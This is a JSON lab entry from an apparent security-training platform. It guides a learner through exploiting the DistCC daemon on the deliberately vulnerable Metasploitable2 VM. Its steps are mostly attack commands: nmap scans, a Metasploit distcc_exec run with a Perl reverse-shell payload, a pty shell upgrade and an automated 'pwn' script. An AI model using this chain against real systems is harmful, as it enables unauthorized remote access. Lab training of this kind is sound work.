{
  "id": "metasploitable2-distcc",
  "name": "Metasploitable2: DistCC RCE",
  "difficulty": "easy",
  "container": "metasploitable2",
  "ip": "172.20.0.20",
  "port": 3632,
  "short_description": "Exploit the DistCC daemon for remote code execution on Metasploitable2.",
  "description": "Metasploitable2 is a deliberately vulnerable Linux VM created by Rapid7 for security training. The DistCC (Distributed C Compiler) daemon allows remote code execution due to a misconfiguration. This is CVE-2004-2687.",
  "steps": [
    {
      "title": "Quick scan for DistCC port",
      "command": "nmap -sV -p 3632 172.20.0.20",
      "explanation": "Check if DistCC is running on the default port. Use this instead of a full port scan to save time.",
      "expected": "3632/tcp open  distccd",
      "duration": "5-10 sec"
    },
    {
      "title": "Optional: Full port scan",
      "command": "nmap -sV -p- 172.20.0.20 --open",
      "explanation": "Full port scan to discover ALL services. Metasploitable2 has many vulnerable services. WARNING: This takes a long time!",
      "expected": "Many open ports including 21, 22, 23, 80, 3632, etc.",
      "duration": "3-5 min"
    },
    {
      "title": "Start Metasploit",
      "command": "msfconsole -q",
      "explanation": "Launch Metasploit Framework in quiet mode.",
      "duration": "5-15 sec"
    },
    {
      "title": "Search for DistCC exploits",
      "command": "search distcc",
      "explanation": "Find exploits for the DistCC service.",
      "expected": "exploit/unix/misc/distcc_exec",
      "duration": "1-2 sec"
    },
    {
      "title": "Load the DistCC exploit",
      "command": "use exploit/unix/misc/distcc_exec",
      "explanation": "Select the DistCC remote code execution module."
    },
    {
      "title": "View options",
      "command": "show options",
      "explanation": "Check required parameters. RHOSTS (target) and LHOST (your IP for reverse shell) are needed."
    },
    {
      "title": "Set the target host",
      "command": "set RHOSTS 172.20.0.20",
      "explanation": "Point the exploit at Metasploitable2."
    },
    {
      "title": "Set your attack machine IP",
      "command": "set LHOST 172.20.0.5",
      "explanation": "This is the Kali container's IP for the reverse shell connection."
    },
    {
      "title": "Set the payload",
      "command": "set PAYLOAD cmd/unix/reverse_perl",
      "explanation": "Use a Perl reverse shell payload (more reliable than bash on older systems)."
    },
    {
      "title": "Run the exploit",
      "command": "run",
      "explanation": "Execute the exploit and get a shell.",
      "expected": "Command shell session opened",
      "duration": "2-5 sec"
    },
    {
      "title": "Check your access (no prompt - just type!)",
      "command": "id",
      "explanation": "No prompt will appear - just type and press Enter! See what user you're running as.",
      "expected": "uid=1(daemon)"
    },
    {
      "title": "Upgrade shell (no prompt - just type!)",
      "command": "python -c 'import pty; pty.spawn(\"/bin/bash\")'",
      "explanation": "No prompt will appear - just type and press Enter! Get a proper interactive shell for privilege escalation."
    },
    {
      "title": "One-command pwn (after you learn it)",
      "command": "pwn distcc",
      "explanation": "Exit the shell (type 'exit' twice) and try this. Now that you understand the attack, this script runs it automatically."
    }
  ],
  "pwn_command": "pwn distcc",
  "success_criteria": "You have a command shell on Metasploitable2. Run 'id' and 'hostname' to confirm you're on the target system.",
  "next_steps": [
    "Try other Metasploitable2 services: vsftpd, Samba, IRC",
    "Explore privilege escalation with 'search post/multi/recon/local_exploit_suggester'",
    "Use 'background' to keep the session and attack other services"
  ]
}
